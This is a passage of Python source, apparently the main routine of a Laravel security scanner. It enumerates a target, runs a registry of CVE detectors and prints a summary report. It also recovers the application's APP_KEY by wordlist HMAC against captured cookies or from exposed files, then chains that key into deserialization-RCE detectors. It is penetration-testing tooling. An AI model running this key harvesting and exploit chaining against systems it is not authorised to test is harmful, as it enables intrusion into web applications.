    # Phase 3: resource discovery — enumerate ecosystem, routes, debug mode.
    # root_resp is cached in laravel_info["_root_resp"] (set by is_laravel()) so GET / is not
    # re-fetched.  env_exposed / vendor_exposed in laravel_info will now always be False because
    # the /.env probe moved to Phase 5's env detector; the keys remain for API compat.
    try:
        _discovery = discover_resources(
            target_url,
            root_resp=(laravel_info or {}).get("_root_resp") if laravel_info else None,
        )
        if not laravel_info:
            laravel_info = _advisory_laravel_info(target_url)
            laravel_info["advisory_mode"] = True
        laravel_info["components"] = _discovery.get("components", [])
        laravel_info["route_map"] = _discovery.get("route_map", {})
        laravel_info["debug_mode"] = _discovery.get("debug_mode", False)
        if _discovery.get("components"):
            print_status(f"Components detected: {', '.join(_discovery['components'])}", "info")
        if _discovery.get("debug_mode"):
            print_status("Debug mode active on target (Ignition/Whoops)", "warning")
    except Exception as _disc_err:
        print_status(f"Resource discovery error (continuing): {_disc_err}", "warning")

    # Offline APP_KEY recovery (zero HTTP) — seeds loot for detect-all chain visibility.
    # Runs after is_laravel() so cookies are available; full chaining into detectors is future work.
    _detect_all_loot = {}
    if args.app_key:
        _detect_all_loot["app_key"] = args.app_key
        _detect_all_loot["app_key_source"] = "operator --app-key"
        print_status("Operator APP_KEY supplied — available for consumer CVE detection", "warning")
    if laravel_info and laravel_info.get("cookies"):
        try:
            from modules.probes.appkey_recovery import recover_app_key
            _arec = recover_app_key(
                target_url,
                laravel_info=laravel_info,
                include_live_cookie=False,
                include_detection_producers=False,
                include_cve_methods=False,
                active_module="appkey-recovery",
            )
            if _arec and _arec.get("app_key"):
                _detect_all_loot["app_key"] = _arec["app_key"]
                _detect_all_loot["app_key_source"] = _arec.get("source") or "wordlist-hmac"
                print_status(
                    f"APP_KEY recovered offline from cookie via wordlist HMAC "
                    f"({_arec.get('detail') or 'captured cookie'}) — key reuse target",
                    "critical")
        except Exception:
            pass

    if framework_detected:
        print_status("Starting comprehensive vulnerability assessment...", "info")
    else:
        print_status("Starting comprehensive vulnerability assessment (advisory mode — modules self-gate)...", "info")
    print_separator()

    # ------------- registry-driven detectors (rec3) -------------
    # All subsequent detection is driven by modules/detect_registry.DETECTORS.
    # This removes the need to edit 60+ imports + call sites in check.py when adding coverage.
    # Each detector is loaded lazily via importlib so a bad module doesn't nuke the whole run.
    # Source creds from -U/-P FIRST (so `check.py <url> -U admin -P secret` works in detect-all, not
    # only via env vars), then fall back to the LW_/SNIPE_ env vars.
    _lw_user = _provided_or(args.username, os.environ.get("LW_USER") or os.environ.get("SNIPE_USER"))
    _lw_pass = _provided_or(args.password, os.environ.get("LW_PASS") or os.environ.get("SNIPE_PASS"))

    _detectors = get_detectors()
    _total = len(_detectors)
    # Per-detector ledger for the end-of-run Summary (mirrors the exploit pipeline's `summary`).
    # Each detector contributes exactly one row; `_row` is created at the top of the iteration and
    # appended immediately, then mutated in place wherever the loop branches/continues — so every
    # skip path (auth-gate, component-absent, import-fail, version-suppress) still gets a row with
    # the right verdict and request count, with no per-branch append to forget.
    _detect_summary = []
    _detect_all_appkey_recovery_checked = False
    # Reset the global request counter so each detector's row reports only ITS request delta
    # (snapshot total before/after the detector's work). Mirrors run_exploitation() at its start.
    http_config.reset_request_stats()
    # _DETECT_ALL_PRODUCERS / _DETECT_ALL_CONSUMERS are module-level constants (defined near
    # _declares_app_key) so tests can import them; the loop below uses them directly.
    for _idx, det in enumerate(_detectors, 1):
        requires_auth = det.get("requires_auth", False)
        # Per-detector progress so the scan reads as real-time work, not a silent hang between hits.
        _label = det.get("cve") or det.get("name")
        _desc = det.get("description", "")
        print_status(f"[{_idx}/{_total}] Scanning {_label}" + (f" — {_desc}" if _desc else "") + " …", "info")

        # Build this detector's summary row up front (mutated in place below). CVE detectors get a
        # cve id (-> rendered like the exploit table via CVE_META); generic probes carry name as the
        # display id and a category-derived severity, so no row ever prints "None (None)".
        _det_cve = det.get("cve")
        _det_meta = CVE_META.get(_det_cve) if _det_cve else None
        _row = {
            "cve": _det_cve or det.get("name"),
            "sev": _det_meta[0] if _det_meta else ("High" if det.get("category") == "cve" else "Info"),
            "vclass": _det_meta[1] if _det_meta else (det.get("category") or "probe"),
            "scan": "not run",
            "is_cve": bool(_det_cve),
            "request_budget": {},
        }
        _detect_summary.append(_row)
        _stats_before = http_config.get_request_stats().get("total", 0)

        def _close_row(verdict):
            """Stamp the row's verdict + this detector's request delta, then return for `continue`.

            INVARIANT: this closure binds the CURRENT iteration's `_row`/`_stats_before` and MUST be
            called within the same iteration (before the loop rebinds them). Every exit path below —
            each `continue` and both terminal branches — calls it exactly once. Do not defer or store
            this closure for later execution; doing so would misattribute the verdict to the last row.
            """
            _delta = http_config.get_request_stats().get("total", 0) - _stats_before
            _row["scan"] = verdict
            if _delta > 0:
                _row["request_budget"] = {"detect": _delta}

        if requires_auth and not (_lw_user or _lw_pass or http_config.has_auth_headers()):
            # Skip auth-gated detectors unless credentials were provided explicitly via -U/-P or -H.
            print_status(
                "    skipped (needs auth: provide -H 'Cookie: ...' or LW_USER/LW_PASS)",
                "warning",
            )
            _close_row("skipped (needs auth)")
            continue

        # requires_component gate — skip CVEs only when the component is CONFIRMED absent on target.
        # Fail-open: when laravel_info is None (advisory mode), or when the probe got 401/403/302
        # (component may be auth-gated), or when discovery didn't run — the detector still runs.
        # Only skip when discover_resources() recorded a "<component>_absent" token (all probe URLs
        # returned 404 or no response, meaning the component is definitively not installed).
        _req_comp = det.get("requires_component")
        if _req_comp and laravel_info:
            _comps = laravel_info.get("components") or []
            if (_req_comp + "_absent") in _comps:
                # Confirmed absent: all probe URLs returned 404 — skip with zero extra requests
                print_status(f"    skipped ({_req_comp} confirmed absent on target — probe returned 404)", "info")
                _close_row(f"skipped ({_req_comp} absent)")
                continue
            # Otherwise: confirmed present, unknown (401/403), or no discovery ran — run the detector

        # Guard the lazy import too: a malformed registry entry (bad module/func) must not abort the
        # whole scan — that would contradict the registry's resilience guarantee.
        try:
            fn = _import_detector(det)
        except Exception as e:
            print_status(f"{det.get('name', '?')}: failed to load detector ({e})", "error")
            _close_row("load error")
            continue
        # Always-offer + signature-filter dispatch (GAP 1 fix). Build ONE candidate kwargs dict by
        # OPERATOR INTENT, then hand each detector only the subset of {session, username, password}
        # its entry fn actually accepts (via _accepted_kwargs). No hand-maintained pass_creds flag is
        # needed: a detector that takes `session=` (e.g. CVE-2020-24940, CVE-2025-49132, CVE-2023-43661)
        # now receives it automatically, while a plain scan(target_url) detector gets nothing extra and
        # never hits a TypeError.
        #
        # The candidate is built once per detector by operator intent (session offered only when -H
        # auth material is present; -U/-P creds always carried) — see _detector_candidate_kwargs.
        candidate = _detector_candidate_kwargs(
            _lw_user,
            _lw_pass,
            cve=_det_cve,
        )
        if extra_options:
            candidate["options"] = extra_options
        # Offer laravel_info so detectors that accept it (e.g. env_exposure) can consume
        # pre-fetched responses from the cache (avoids double-fetches like /.env).
        candidate["laravel_info"] = laravel_info
        if (
            det.get("name") in _DETECT_ALL_CONSUMERS
            and not _detect_all_loot.get("app_key")
            and not _detect_all_appkey_recovery_checked
        ):
            _detect_all_appkey_recovery_checked = True
            try:
                from modules.probes.appkey_recovery import recover_app_key
                _rec = recover_app_key(
                    target_url,
                    laravel_info=laravel_info,
                    session=candidate.get("session"),
                    username=_lw_user,
                    password=_lw_pass,
                    options=extra_options,
                    include_live_cookie=True,
                    include_detection_producers=True,
                    include_cve_methods=False,
                    active_module=det.get("name"),
                )
            except Exception:
                _rec = None
            if _rec and _rec.get("app_key"):
                _detect_all_loot["app_key"] = _rec["app_key"]
                _detect_all_loot["app_key_source"] = _rec.get("source") or _rec.get("method") or "appkey-recovery"
                print_status(
                    f"APP_KEY recovered by standard workflow from {_detect_all_loot['app_key_source']} — "
                    f"available for consumer CVE chaining",
                    "warning",
                )
        # APP_KEY consumer forwarding: if a producer harvested a key this run, offer it to the
        # candidate for the consumer allowlist. The 4 consumers now declare an EXPLICIT app_key
        # parameter and consume it (a real .env -> key -> deserialize-RCE chain: the injected key
        # upgrades their verdict from "sink present" to "confirmed exploitable now").
        if det.get("name") in _DETECT_ALL_CONSUMERS and _detect_all_loot.get("app_key"):
            candidate["app_key"] = _detect_all_loot["app_key"]
        call_kwargs = _accepted_kwargs(fn, candidate)
        # Log the chain ONLY when the detector's scan() EXPLICITLY declares an app_key parameter
        # (i.e. genuinely uses it). A bare **kwargs consumer would have app_key in call_kwargs yet
        # silently discard it — gating on `"app_key" in call_kwargs` alone would re-introduce the
        # false "chaining…" line. _declares_app_key inspects the real signature.
        if "app_key" in call_kwargs and _declares_app_key(fn):
            print_status(
                f"    chaining APP_KEY from {_detect_all_loot.get('app_key_source', '?')} "
                f"into {det.get('name')} scan()", "warning")
        res = _safe_scan(det["name"], fn, target_url, **call_kwargs)

        res_norm = normalize_detection_result(_det_cve, res, vuln_class=_row.get("vclass"))
        verdict = res_norm.get("verdict") or detection_verdict(res, vuln_class=_row.get("vclass"))
        _row["detection"] = res_norm

        # Lightweight result reporting. Only confirmed_vulnerable is reported as a CVE hit;
        # fingerprints, version matches, and precondition-only findings remain visible in JSON/summary.
        if _scan_is_hit(verdict):
            cve = det.get("cve")
            # Central version-applicability gate (Part A): suppress a framework-version-bound
            # CVE when the AUTHORITATIVE composer.lock version (resolved by is_laravel above)
            # is confidently known AND clearly outside the CVE's affected range. Conservative:
            # only the opt-in CVEs in AFFECTED_VERSION are touched, and only when the version
            # parses precisely — version-independent findings and unknown-version targets are
            # left alone. Kills the :18081 FP cluster (CVE-2018-15133, CVE-2021-28254) whose
            # own detectors set vulnerable=True on .env/vendor-source disclosure.
            _fw_ver = (laravel_info or {}).get("composer_lock_version") if laravel_info else None
            _suppress = version_suppresses(cve, _fw_ver) if cve else None
            if _suppress:
                print_status(_suppress, "info")
                res_norm["verdict"] = "blocked_by_control"
                res_norm["status"] = "blocked_by_control"
                res_norm["suppressed"] = True
                res_norm["suppression_reason"] = _suppress
                _close_row("blocked_by_control")
                continue
            _close_row(verdict)
            title = f"{cve} — {det.get('description')}" if cve else det.get("description", det["name"])
            # Severity from the canonical CVE_META (Independent severity) when known, else a
            # category default — a Medium XSS must not print as CRITICAL.
            meta = CVE_META.get(cve) if cve else None
            sev = _SEV_STATUS.get(meta[0], "warning") if meta else ("warning" if det.get("category") == "cve" else "info")
            print_status(f"Detector confirmed: {title}", sev)
            # Show a compact view of the returned dict (modules can return rich keys)
            try:
                slim = {k: v for k, v in list(res.items())[:6] if not isinstance(v, (dict, list)) or k in ("vulnerable", "path", "url")}
                if slim:
                    print_vulnerability_details(det["name"].upper(), slim)
            except Exception:
                print_vulnerability_details(det["name"].upper(), {"result": str(res)[:200]})
            # APP_KEY harvest from producer detectors — seeds _detect_all_loot for consumer chaining.
            # Only harvest from the 4 confirmed producer modules; gate on first-win (never overwrite).
            # All 4 producers (env_exposure included) now explicitly emit artifacts["app_key"] with the
            # extracted key VALUE, so this single generic read covers every producer uniformly.
            if det.get("name") in _DETECT_ALL_PRODUCERS and not _detect_all_loot.get("app_key"):
                _raw_key = None
                if isinstance(res, dict):
                    _raw_key = (res.get("artifacts") or {}).get("app_key")
                if _raw_key:
                    _detect_all_loot["app_key"] = _raw_key
                    _detect_all_loot["app_key_source"] = det.get("name", "?")
                    print_status(
                        f"APP_KEY harvested from {det.get('name')} detection — "
                        f"available for consumer CVE chaining", "warning")
        else:
            # keep output volume reasonable; only log misses for high value in verbose mode
            _close_row(verdict or "not_detected")

    # ------------- end-of-run Summary (shared renderer, same format as --exploit) -------------
    # CVE-class detectors render in the primary CVE table (most-critical-first, matching the
    # exploitation summary). Generic/non-CVE probes (header hygiene, mass-assignment, env/git
    # exposure, …) are listed in a separate "other detectors" block so the CVE table stays a clean
    # parallel to the exploit ledger.
    _cve_rows = [r for r in _detect_summary if r.get("is_cve")]
    _probe_rows = [r for r in _detect_summary if not r.get("is_cve")]
    # Defer "Done." until after the non-CVE probe block so it stays the last line of the summary.
    # highlight=True: detect-only runs make confirmed vulnerabilities pop (bright green + "► CONFIRMED")
    # and dim the misses so a single hit in a 40-CVE table is impossible to miss.
    _print_summary(_cve_rows, do_exploit=False, sort=True, headline_label="CVE",
                   print_done=False, highlight=True)
    if _probe_rows:
        print_status("Other detectors (non-CVE probes):", "info")
        for _r in _probe_rows:
            _b = _r.get("request_budget") or {}
            _bn = (f"  {Fore.BLUE}[requests: detect={_b['detect']}]{Style.RESET_ALL}"
                   if _b.get("detect") else "")
            if _scan_is_hit(_r["scan"]):
                # Same highlight treatment as the CVE table: leading marker, then bright-green verdict.
                print(f"    {Fore.GREEN}{Style.BRIGHT}[{_r['vclass']:14s}]{Style.RESET_ALL} "
                      f"{Fore.YELLOW}{Style.BRIGHT}{_r['cve']}{Style.RESET_ALL} -> "
                      f"► {Fore.GREEN}{Style.BRIGHT}CONFIRMED{Style.RESET_ALL}  "
                      f"scan: {Fore.GREEN}{Style.BRIGHT}{_r['scan']}{Style.RESET_ALL}{_bn}")
            else:
                _pline = f"    [{_r['vclass']:14s}] {_r['cve']} -> scan: {_r['scan']}{_bn}"
                _pline = _pline.replace(Style.RESET_ALL, Style.RESET_ALL + Style.DIM)
                print(f"{Style.DIM}{_pline}{Style.RESET_ALL}")
        print_separator()
    _detect_payload = {
        "ok": True,
        "mode": "detect-all",
        "target": target_url,
        "summary": _detect_summary,
        "cve_rows": _cve_rows,
        "probe_rows": _probe_rows,
        "loot": {
            "app_key_present": bool(_detect_all_loot.get("app_key")),
            "app_key_source": _detect_all_loot.get("app_key_source"),
        },
    }
    _write_json_report(args.json_out, _detect_payload)
    print_status("Done.", "success")

    print_status("Vulnerability assessment completed (registry-driven)!", "success")
    print_status(f"Scan finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "info")
    print(f"""
{Fore.CYAN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════
                                                                     
     {Fore.GREEN} Laravel Security Assessment Complete                         
                                                                     
     {Fore.YELLOW} For question and inquiry:                                  
     {Fore.BLUE} Contact Mickoe or IJ                                            
                                                                     
     {Fore.RED} Remember: Use this tool only on systems you own or        
        have explicit permission to test!                           
                                                                    
{Fore.CYAN}══════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
    """)


if __name__ == "__main__":
    main()
